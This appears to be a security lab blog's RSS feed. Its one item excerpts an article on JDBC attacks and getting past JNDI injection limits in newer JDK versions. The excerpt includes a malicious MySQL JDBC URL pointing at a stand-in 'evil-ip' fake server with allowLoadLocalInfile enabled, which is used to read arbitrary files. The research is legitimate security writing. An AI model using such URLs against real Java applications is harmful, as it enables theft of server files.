<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JNDI on 天工实验室</title>
    <link>http://localhost:1313/tags/jndi/</link>
    <description>Recent content in JNDI on 天工实验室</description>
    <generator>Hugo -- 0.133.1</generator>
    <language>zh</language>
    <copyright>天工实验室</copyright>
    <lastBuildDate>Wed, 24 Jul 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/jndi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>JDBC Attack 与高版本 JDK 下的 JNDI Bypass</title>
      <link>http://localhost:1313/blog/tiangongarticle040/</link>
      <pubDate>Wed, 24 Jul 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/blog/tiangongarticle040/</guid>
      <description>JDBC Attack 与高版本 JDK 下的 JNDI Bypass 一、前言 JNDI 注入作为 Java 攻击的常见 Sink 点，通常被用于 Weblogic 以及 Fastjson 等常见目标的攻击流程中，而 JNDI 注入的利用经过 JDK 新版本对相关利用的修复，以及一些常见依赖利用方式的变化，在高版本 JDK 中，其利用逐渐遭遇了困境。而 JDBC Attack，作为针对 Java 数据库引擎的一种攻击方式，除了其常规的利用方式之外，也可以与原生反序列化结合起来，实现对 JNDI 攻击的扩展，解决高版本下 JNDI 注入的困境。
二、关于 JDBC Attack 首先是关于基础的JDBC Attack的一些回顾，JDBC 是Java应用在连接不同的底层数据库引擎时使用的抽象层，使得Java应用可以用相同的接口对各种不同的数据库进行抽象的控制，JDBC使用如下的URL格式进行连接。
Class.forName(&amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;); String url = &amp;#34;jdbc:mysql://mysql.db.server:3306/my_database?useSSL=false&amp;amp;serverTimezone=UTC&amp;#34; Connection conn = DriverManager.getConnection(url) 而该URL中，后面的可控参数就是针对不同数据库Driver进行利用的入口。
接下来我们来回顾一下常见的几个 Driver 的利用：
2.1 MySQL Driver 针对MySQL Driver的通用利用主要是使用 Fake Server 进行任意文件读，首先需要配置 MySQL fake server，然后开启 allowLoadLocalInfile=true 设置，构造形如 jdbc:mysql://evil-ip:3306/test?allowLoadLocalInfile=true 的 URL 去请求 fake server 即可进行利用。</description>
    </item>
  </channel>
</rss>
